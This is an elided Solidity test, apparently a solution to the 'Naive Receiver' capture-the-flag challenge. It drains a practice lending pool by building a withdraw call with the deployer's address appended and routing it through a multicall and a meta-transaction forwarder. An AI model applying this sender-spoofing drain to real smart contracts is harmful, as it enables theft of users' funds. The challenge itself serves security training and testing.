...
contract NaiveReceiverChallenge is Test {
    ...
    function test_naiveReceiver() public checkSolvedByPlayer {
        ...
        bytes memory withdrawPayload = abi.encodeWithSelector(
            NaiveReceiverPool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, address(recovery), deployer
        );
        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = withdrawPayload;
        bytes memory multicallPayload = abi.encodeWithSelector(Multicall.multicall.selector, multicallData);
        ...
        forwarder.execute{gas: 100_000_000}(request, signature);
    }
